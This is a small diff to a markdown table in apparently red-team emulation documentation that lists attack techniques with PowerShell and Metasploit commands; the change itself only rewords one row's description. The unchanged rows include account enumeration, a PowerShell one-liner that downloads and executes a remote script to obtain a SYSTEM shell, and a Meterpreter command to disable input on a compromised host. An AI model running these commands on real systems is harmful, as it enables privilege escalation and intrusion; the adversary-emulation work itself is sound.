@@ -109,7 +109,7 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 | WMIObject Group Discovery   | To enumerate local groups on the endpoint. | # powershell<br>> Get-WMIObject Win32_Group |
 | Enumerate accounts    | Enumerate all accounts via PowerShell. |  # powershell<br>> net user /domain<br>> get-localgroupmember -group Users<br>> get-aduser -filter *  |
 | Pop System Shell | Pop System Shell using Token Manipulation technique via function of WinPwn.   | # powershell<br>> iex(new-objectnet.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem  |
-|UI Control Manipulation          | The command `uictl` is used within a Meterpreter session to control user interface components on a compromised system.      | # msfconsole<br>> uictl [enable/disable] [keyboard/mouse/all]  |
+|UI Control Manipulation          | The command is used to control user interface components on a compromised system.      | # msfconsole<br>> uictl [enable/disable] [keyboard/mouse/all]  |
 
 
 
